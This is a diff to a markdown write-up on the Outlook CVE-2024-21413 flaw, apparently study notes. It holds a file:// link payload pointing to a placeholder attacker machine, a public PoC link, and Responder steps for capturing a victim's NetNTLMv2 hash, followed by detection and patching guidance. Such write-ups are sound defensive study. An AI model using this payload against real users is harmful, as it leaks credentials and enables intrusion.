@@ -26,3 +26,32 @@
 
 #### 1) <p><a href="file://ATTACKER_MACHINE/test!exploit"<Click me</a></p<
 
+### POC: https://github.com/CMNatic/CVE-2024-21413
+
+### Steps:
+
+#### 1) sudo responder -I INTERFACE
+
+#### 2) Modify the exploit PoC according to use case
+
+#### 3) Run the exploit
+
+#### 4) User clicks the hyperlink and his NetNTLMv2 hash is been captured by our responder server.
+
+## DETECTION
+
+### 1) YARA rule written by Florian Roth: https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar
+
+### 2) Wireshark: The SMB request from the victim to the client can be seen in a packet capture with a truncated NetNTLMv2 hash
+
+## REMEDIATION
+
+#### 1) Patch to the latest version if possible: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413 or https://www.catalog.update.microsoft.com/Home.aspx
+
+#### 2)  Remind users to:
+
+##### Do not click random links 
+
+##### Preview links before clicking them
+
+##### Forward suspicious emails to the respective department responsible for cybersecurity
